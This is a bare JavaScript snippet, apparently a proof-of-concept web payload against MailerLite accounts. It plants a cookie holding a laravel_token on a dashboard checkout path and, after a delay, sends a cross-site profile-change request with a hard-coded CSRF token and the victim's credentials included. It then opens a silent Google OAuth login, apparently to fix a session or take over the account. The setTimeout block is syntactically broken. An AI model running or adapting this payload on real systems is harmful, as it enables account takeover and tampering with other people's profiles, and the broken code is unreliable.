document.cookie = 'laravel_token=eyJpdiI6InlZMWVYbUl4MGxXcWovYjhrbEhiTnc9PSIsInZhbHVlIjoiRzdRK1ZGVmZlVTUwRTVQQis3THhhRyttZlZkNGdNOFFkVXlOS2FNVEVPU3l0VlVYM2t3SGVBMFRhVndGWlBkdTlya25FMzRpY241bGJOc1crdEtxZDB1SGpqY2JRTUJ6L2tueS91RnV1ZzJFVHd2RmNrcU14MXdrMTFzOW12VFcrK1JSeG1xRFp3YkducDg3UnIrTi9OcTZMaFUwV3RPQVRwSE53NVpESGRvd3h2Z09ONTJSbHU1dFBOU3p6WkZxb1h3VVFONENxektTTFVuOFhPbEtjSlN5UWxsZ2txYnF5Uncvd3lpOXFLUVBJQ0tNRkZoRzF2cmJvblk0bmxjTnpwMjcxaEpld3o0Rnp5MUlvNFRSYW5jY29YNkJQUDd3RTlvT21NZ0lqaURjcmtkZjdhZjlzL1hkZHl1UUNkaSsiLCJtYWMiOiIyNGM5Njk0ZWQ4ODJiN2JhMzRmNWUwMTVhMThmZTc4MDE4OGFkZjgzNDZmZTM1ODgxNWVkODNmMDQ2NjU5YmI0IiwidGFnIjoiIn0%3D; path=/products/167453999052621465/checkout/edit; domain=dashboard.mailerlite.com; Secure';

setTimeout(function(){
        const data = new URLSearchParams({
          _token: "yyxh1Jkm8QmYEQzWtKWaHOvjVWeh8dAGP0OgCJdM",
          _method: "PUT",
          avatar: "",
          name: "Gustavoszzzzzzzzzzzzzzzzzzzzzzzz",
          last_name: "Ribeiro",
          current_password: "",
          new_password: "",
          new_password_confirmation: "",
          language: "en",
          subscribed_newsletter_mailerlite: "0",
          theme: "light"
        });

        fetch('https://accounts.mailerlite.com/profile', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: data.toString(),
          credentials: 'include' // importante se precisar enviar cookies de autenticação
        })
        .then(response => response.json())
        .then(result => {
          console.log(result);
        })
        .catch(error => {
          console.error('Erro:', error);
        });
), 5000};
window.open("https://accounts.google.com/o/oauth2/v2/auth?as=AKF4tMmt3F52VXAA2Fq_tzFAUy9PRbyAzPqfTtLvsYI&client_id=588658642171-uatqq7pju7oriee4dhnno0f8oeekc047.apps.googleusercontent.com&scope=openid%20email%20profile&response_type=id_token&gsiwebsdk=gis_attributes&redirect_uri=https%3A%2F%2Faccounts.mailerlite.com%2Fauth%2Fgoogle%2Fcallback&response_mode=form_post&display=page&prompt=none&gis_params=Ch9odHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tEjRodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tL2F1dGgvZ29vZ2xlL2NhbGxiYWNrGAciEGMyZGNiZDYwOGQzMTE4MzkqK0FLRjR0TW10M0Y1MlZYQUEyRnFfdHpGQVV5OVBSYnlBelBxZlR0THZzWUkySDU4ODY1ODY0MjE3MS11YXRxcTdwanU3b3JpZWU0ZGhubm8wZjhvZWVrYzA0Ny5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbTgCWiBodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tLw")
